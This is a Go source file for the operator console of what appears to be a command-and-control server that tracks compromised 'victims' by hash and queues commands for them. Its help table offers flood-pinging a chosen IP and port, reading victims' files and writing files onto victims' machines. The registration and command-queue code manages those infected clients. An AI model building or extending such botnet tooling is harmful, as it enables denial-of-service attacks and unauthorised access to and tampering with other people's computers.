package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"

	rbt "github.com/emirpasic/gods/trees/redblacktree"
	"github.com/olekukonko/tablewriter"
)

// Setup for Red and Black Tree
var clientTree = rbt.NewWithStringComparator()

// menu banner
func displayMenu() {
	//clear the terminal
	CallClear()
	//title card
	fmt.Println("_______  _______  _______ _________ _______ _________ _        _______ _________ _______")
	fmt.Println("(  ___  )(  ____ \\(  ____ \\__   __/(       )\\__   __/( \\      (  ___  )\\__   __/(  ____ \\")
	fmt.Println("| (   ) || (    \\/| (    \\/   ) (   | () () |   ) (   | (      | (   ) |   ) (   | (    \\/")
	fmt.Println("| (___) || (_____ | (_____    | |   | || || |   | |   | |      | (___) |   | |   | (__    ")
	fmt.Println("|  ___  |(_____  )(_____  )   | |   | |(_)| |   | |   | |      |  ___  |   | |   |  __)   ")
	fmt.Println("| (   ) |      ) |      ) |   | |   | |   | |   | |   | |      | (   ) |   | |   | (      ")
	fmt.Println("| )   ( |/\\____) |/\\____) |___) (___| )   ( |___) (___| (____/\\| )   ( |   | |   | (____/\\")
	fmt.Println("|/     \\|\\_______)\\_______)\\_______/|/     \\|\\_______/(_______/|/     \\|   )_(   (_______/")
	fmt.Print(("\n\n\n\n(C2C) > "))
	time.Sleep(500 * time.Millisecond)
}

// prints when an invalid command is entered
func genericHelp() {
	fmt.Println("Invalid Command, use the /help command for details of all the commands")
}

// Handler for menu
func Handler() {

	var command string
	var commandParamList []string
	fmt.Print(("(C2C)> "))
	// Create a new scanner to read from standard input
	scanner := bufio.NewScanner(os.Stdin)
	// Read the user input
	scanner.Scan()
	userInput := scanner.Text()
	if userInput == "" {
		return
	}
	//finds the end of the initial command
	spaceIndex := strings.Index(userInput, " ")
	if spaceIndex == -1 {
		command = userInput
	} else {
		//the command
		command = userInput[:spaceIndex]
		commandParams := userInput[spaceIndex+1:]
		//all the subsequent parameters
		commandParamList = strings.Fields(commandParams)
	}
	for _, b := range options {
		//enter only if command is a real command
		if b.Cmd == command {
			if hasParamCount(len(commandParamList), b.ParamCount) {
				//pass all command parameters (of any size)
				b.Action(commandParamList)
				return
			}
		}
	}

	//provide the user a default help for entering commands
	genericHelp()

}

func hasParamCount(count int, target int) bool {
	return count == target || target == -1
}

func specificHelp(params ...interface{}) {
	// Create a new table writer
	table := tablewriter.NewWriter(os.Stdout)

	// Set headers for the table
	table.SetHeader([]string{"Command", "Parameters", "Description"})

	// Add rows to the table
	table.Append([]string{"/help", "None", "Prints out table of commands with parameters and descriptions"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/clear", "None", "Clear terminal window"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/exit", "None", "Safely exit the C2C terminal application"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/list", "None", "Curently still in progress"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/supercatfile", "Hash", "Showing the supercat of a hash"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/floodping", "Hash, IP, Port", "floodping for victim"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/supercat", "Hash, file pattern", "cats victims file"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/writefile", "Hash, file", "write a file to the vicitim"})

	// Render the table
	table.Render()
}

// code snippet taken from https://stackoverflow.com/questions/22891644/how-can-i-clear-the-terminal-screen-in-go
var clear map[string]func() //create a map for storing clear funcs

func CallClear(params ...interface{}) {
	value, ok := clear[runtime.GOOS] //runtime.GOOS -> linux, windows, darwin etc.
	if ok {                          //if we defined a clear func for that platform:
		value() //we execute it
	} else { //unsupported platform
		panic("Your platform is unsupported! I can't clear terminal screen :(\n")
	}
}

func printlNDebug(input string) {
	if globalDEBUG {
		println("DEBUG::" + input)
	}
}

//FREDY implement this given a incoming string
/* SHOULD BE JSON OF THIS FORM USE UNMARSHALL
type IncomingClientRegistration struct {
	Hash string
	//other stuff not in here now

}
*/
func registerNewClient(incomingJson string) {

	var client IncomingVictimRequest

	err := json.Unmarshal([]byte(incomingJson), &client)
	if err != nil {
		fmt.Println("Failed to parse client registration JSON:", err)
		return
	}

	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()
	// in case if client already exists
	if _, exists := clientTree.Get(client.RequesterHash); !exists {
		victim := VictimInfo{
			Hash:     client.RequesterHash,
			Commands: []VictimCommand{},
		}
		clientTree.Put(client.RequesterHash, victim)
		fmt.Println("Registered new client with hash:", client.RequesterHash)
	}

}

func AddCommandToVictim(hash string, command VictimCommand) {
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()

	val, found := clientTree.Get(hash)
	if found {
		victim := val.(VictimInfo)
		victim.Commands = append(victim.Commands, command)
		clientTree.Put(hash, victim)
		fmt.Println("Added command to victim:", hash)
	} else {
		fmt.Println("Victim not found:", hash)
	}
}
